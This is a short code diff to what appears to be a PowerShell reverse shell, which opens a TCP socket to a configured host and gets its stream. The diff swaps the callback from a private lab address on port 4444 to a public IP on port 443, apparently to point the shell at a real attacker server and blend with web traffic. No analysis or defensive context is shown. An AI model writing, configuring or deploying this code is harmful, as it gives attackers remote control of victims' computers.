@@ -3,9 +3,9 @@ if ($client.Connected -eq $true) {$client.Close()}
 if ($process.ExitCode -ne $null) {$process.Close()}
 exit}
 // Setup IPADDR
-$address = '192.168.25.9'
+$address = '198.211.113.157'
 // Setup PORT
-$port = '4444'
+$port = '443'
 $client = New-Object system.net.sockets.tcpclient
 $client.connect($address,$port)
 $stream = $client.GetStream()
